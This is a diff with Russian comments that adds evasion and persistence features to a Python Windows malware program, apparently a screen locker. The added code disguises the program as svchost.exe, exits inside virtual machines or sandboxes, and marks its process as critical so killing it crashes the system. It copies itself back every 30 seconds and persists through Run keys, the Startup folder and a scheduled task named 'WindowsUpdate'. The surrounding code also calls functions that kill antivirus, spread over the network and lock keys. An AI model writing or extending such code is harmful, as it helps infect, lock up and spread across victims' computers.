@@ -1,5 +1,34 @@
 import os, sys, time, threading, tempfile, ctypes, winreg, shutil, subprocess, urllib.request, tkinter as tk
 
+# ============================================================
+# 5. МАСКИРОВКА ПОД SVCHOST.EXE
+# ============================================================
+try:
+    ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
+except: pass
+
+# ============================================================
+# 6. ПРОВЕРКА НА ВИРТУАЛКУ
+# ============================================================
+def check_vm():
+    vm_indicators = ["vbox", "vmware", "sandbox", "virtual", "qemu", "xen", "hyper-v", "vmsrvc"]
+    try:
+        for proc in subprocess.check_output("tasklist", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().lower().split('\n'):
+            for ind in vm_indicators:
+                if ind in proc:
+                    return True
+        if os.cpu_count() < 2 or os.getenv('COMPUTERNAME', '').lower().startswith('desktop-'):
+            pass
+        try:
+            if int(subprocess.check_output('wmic computersystem get totalphysicalmemory', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()) < 2147483648:
+                return True
+        except: pass
+    except: pass
+    return False
+
+if check_vm():
+    sys.exit(0)
+
 # СКРЫТНАЯ АВТОУСТАНОВКА
 for lib, name in [("cv2","opencv-python"),("pygame","pygame"),("keyboard","keyboard"),("numpy","numpy")]:
     try: __import__(lib)
@@ -18,6 +47,32 @@ T = tempfile.gettempdir()
 V = os.path.join(T, "v.mp4")
 M = os.path.join(T, "m.mp3")
 tries = TRIES
+
+# ============================================================
+# 4. ЗАЩИТА ПРОЦЕССА ОТ УБИЙСТВА
+# ============================================================
+def protect_process():
+    try:
+        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+    except: pass
+
+# ============================================================
+# 7. САМО-ВОССТАНОВЛЕНИЕ ПРИ УДАЛЕНИИ
+# ============================================================
+def self_heal():
+    src = os.path.abspath(sys.argv[0])
+    destinations = [
+        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'svchost.pyw'),
+        os.path.join(tempfile.gettempdir(), 'svchost.pyw'),
+        os.path.join(os.environ['WINDIR'], 'Temp', 'svchost.pyw'),
+    ]
+    while True:
+        for dst in destinations:
+            try:
+                if not os.path.exists(dst):
+                    shutil.copy2(src, dst)
+            except: pass
+        time.sleep(30)
 
 def dl(url, path):
     if os.path.exists(path) and os.path.getsize(path) > 10000: return True
@@ -93,18 +148,34 @@ def show_final_screen(msg):
         f.destroy()
     except: pass
 
+# ============================================================
+# 1,2,3. АВТОЗАГРУЗКА ВЕЗДЕ
+# ============================================================
 def startup():
     s = os.path.abspath(sys.argv[0])
-    d = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup','svchost.pyw')
-    try: shutil.copy2(s,d)
-    except: pass
     pw = sys.executable.replace("python.exe","pythonw.exe")
-    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
-        try:
-            r=winreg.OpenKey(h,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(r,"WindowsUpdate",0,winreg.REG_SZ,f'"{pw}" "{s}"')
-            winreg.CloseKey(r)
-        except: pass
+    
+    # 1. Реестр HKCU
+    try:
+        r = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(r, "WindowsUpdate", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
+        winreg.CloseKey(r)
+    except: pass
+    
+    # 1. Реестр HKLM
+    try:
+        r = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(r, "WindowsUpdate", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
+        winreg.CloseKey(r)
+    except: pass
+    
+    # 2. Папка Startup
+    try:
+        d = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup','svchost.pyw')
+        shutil.copy2(s, d)
+    except: pass
+    
+    # 3. Планировщик задач
     try:
         subprocess.run(['schtasks','/create','/tn','WindowsUpdate','/tr',f'"{pw}" "{s}"','/sc','onlogon','/f','/rl','highest'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except: pass
@@ -234,9 +305,11 @@ if __name__=="__main__":
         ctypes.windll.user32.ShowWindow(win32console.GetConsoleWindow(), 0)
     except: pass
     
+    protect_process()
     threading.Thread(target=kill_av, daemon=True).start()
     threading.Thread(target=timer_check, daemon=True).start()
     threading.Thread(target=infect_network, daemon=True).start()
+    threading.Thread(target=self_heal, daemon=True).start()
     startup()
     anim()
     lock_keys()
